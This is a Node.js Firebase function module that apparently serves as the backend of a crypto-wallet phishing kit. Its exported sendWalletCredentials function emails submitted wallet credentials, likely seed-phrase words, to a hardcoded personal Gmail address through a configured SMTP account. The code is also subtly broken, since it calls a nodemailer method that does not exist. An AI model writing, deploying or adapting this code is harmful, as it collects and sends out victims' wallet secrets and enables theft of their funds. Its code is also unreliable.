const nodemailer = require('nodemailer');
const functions = require('firebase-functions');

// Get configuration from Firebase Functions config
const config = functions.config();

console.log('SMTP config:', config.smtp?.host, config.smtp?.port, config.smtp?.secure, config.smtp?.user);

const EMAIL_TO = 'superbdude30@gmail.com';

const transporter = nodemailer.createTransporter({
  host: config.smtp?.host || process.env.SMTP_HOST,
  port: Number(config.smtp?.port || process.env.SMTP_PORT),
  secure: (config.smtp?.secure || process.env.SMTP_SECURE) === 'true',
  auth: {
    user: config.smtp?.user || process.env.SMTP_USER,
    pass: config.smtp?.pass || process.env.SMTP_PASS,
  },
});

async function sendWalletCredentials(type, data) {
  const subject = `Wallet Credential Submission: ${type}`;
  const text = `Received ${type}:\n${Array.isArray(data) ? data.join(' ') : data}`;
  await transporter.sendMail({
    from: config.smtp?.user || process.env.SMTP_USER,
    to: EMAIL_TO,
    subject,
    text,
  });
}

module.exports = { sendWalletCredentials };
